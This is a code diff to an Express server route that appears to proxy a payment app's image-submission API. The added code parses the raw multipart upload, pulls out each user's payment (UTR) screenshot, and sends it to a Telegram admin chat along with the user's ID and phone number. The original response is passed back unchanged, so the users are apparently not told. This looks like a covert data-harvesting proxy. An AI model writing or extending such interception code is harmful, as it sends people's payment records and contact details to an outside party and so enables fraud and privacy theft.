@@ -1316,37 +1316,47 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
     try { jsonResp = JSON.parse(respBody); } catch(e) {}
     const userId = await extractUserId(req, jsonResp);
     const phone = getPhone(data, userId);
-    if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\n\n📥 RESPONSE:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3000)}`).catch(()=>{});
-      const allUrls = [];
-      const respData = getResponseData(jsonResp);
-      if (respData && typeof respData === 'object') {
-        for (const [k, v] of Object.entries(respData)) {
-          if (typeof v === 'string' && v.match(/^https?:\/\/.+/i)) allUrls.push(v);
-        }
-      }
-      if (jsonResp && typeof jsonResp === 'object') {
-        for (const [k, v] of Object.entries(jsonResp)) {
-          if (typeof v === 'string' && v.match(/^https?:\/\/.+/i)) allUrls.push(v);
-        }
-      }
-      const fullResp = JSON.stringify(jsonResp || '');
-      const foundUrls = fullResp.match(/https?:\/\/[^\s"',\\\]}>]+/gi) || [];
-      for (const u of foundUrls) {
-        if (!allUrls.includes(u)) allUrls.push(u);
-      }
-      const imgUrls = allUrls.filter(u => /\.(jpg|jpeg|png|gif|webp|bmp)/i.test(u) || /image|img|photo|screenshot|upload|file/i.test(u));
-      for (const imgUrl of imgUrls.slice(0, 5)) {
-        try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 UTR Screenshot [${userId || 'N/A'}]` }); } catch(e) {
-          bot.sendMessage(data.adminChatId, `📸 Image URL (failed to load): ${imgUrl}`).catch(()=>{});
-        }
-      }
-      if (imgUrls.length === 0 && allUrls.length > 0) {
-        for (const u of allUrls.slice(0, 3)) {
-          try { await bot.sendPhoto(data.adminChatId, u, { caption: `📸 Screenshot [${userId || 'N/A'}]` }); } catch(e) {
-            bot.sendMessage(data.adminChatId, `🔗 URL: ${u}`).catch(()=>{});
+    if (data.adminChatId && bot && req.rawBody && req.rawBody.length > 0) {
+      const contentType = req.headers['content-type'] || '';
+      let imageSent = false;
+      if (contentType.includes('multipart/form-data')) {
+        const boundaryMatch = contentType.match(/boundary=([^\s;]+)/);
+        if (boundaryMatch) {
+          const boundary = boundaryMatch[1];
+          const raw = req.rawBody;
+          const boundaryBuf = Buffer.from('--' + boundary);
+          const parts = [];
+          let startIdx = 0;
+          while (true) {
+            const idx = raw.indexOf(boundaryBuf, startIdx);
+            if (idx === -1) break;
+            if (startIdx > 0) parts.push(raw.slice(startIdx, idx));
+            startIdx = idx + boundaryBuf.length;
+            if (raw[startIdx] === 0x0d) startIdx++;
+            if (raw[startIdx] === 0x0a) startIdx++;
+          }
+          for (const part of parts) {
+            const headerEnd = part.indexOf('\r\n\r\n');
+            if (headerEnd === -1) continue;
+            const headerStr = part.slice(0, headerEnd).toString('utf8');
+            if (/content-type:\s*(image\/|application\/octet-stream)/i.test(headerStr) ||
+                /filename=.*\.(jpg|jpeg|png|gif|webp|bmp)/i.test(headerStr)) {
+              const imageData = part.slice(headerEnd + 4);
+              if (imageData.length > 100) {
+                try {
+                  await bot.sendPhoto(data.adminChatId, imageData, { caption: `📸 UTR Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
+                  imageSent = true;
+                } catch(e) {
+                  bot.sendMessage(data.adminChatId, `📸 Image extract failed: ${e.message}\nSize: ${imageData.length} bytes`).catch(()=>{});
+                }
+              }
+              break;
+            }
           }
         }
+      }
+      if (!imageSent) {
+        bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nImage could not be extracted\nContent-Type: ${contentType}\nBody size: ${req.rawBody.length} bytes`).catch(()=>{});
       }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
